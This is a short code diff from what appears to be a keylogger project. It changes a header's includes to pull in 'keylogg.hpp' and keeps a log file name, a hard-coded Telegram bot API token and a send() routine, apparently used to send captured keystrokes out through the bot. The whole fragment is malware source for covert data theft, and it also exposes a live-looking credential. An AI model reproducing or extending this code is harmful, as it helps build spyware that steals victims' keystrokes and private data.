@@ -1,16 +1,5 @@
-#ifndef SENDMAIL_H
-#define SENDMAIL_H
-
-#include <fstream>
-#include <vector>
-#include <Windows.h>
-#include "IO.h"
-#include "Timer.h"
-#include "Helper.h"
-
-#define SCRIPT_NAME "sm.ps1"
-
-using namespace std;
+#include "headers.hpp"
+#include "keylogg.hpp"
 
 const string LOGFILENAME = "data.th";
 const string BOTAPI = "5502518374:AAFtTM3KMf3HZGSn9D3___As4YpeK0iZlPA";
@@ -36,5 +25,3 @@ void send() {
 		ofs.close();
 	}
 }
-
-#endif // SENDMAIL_H
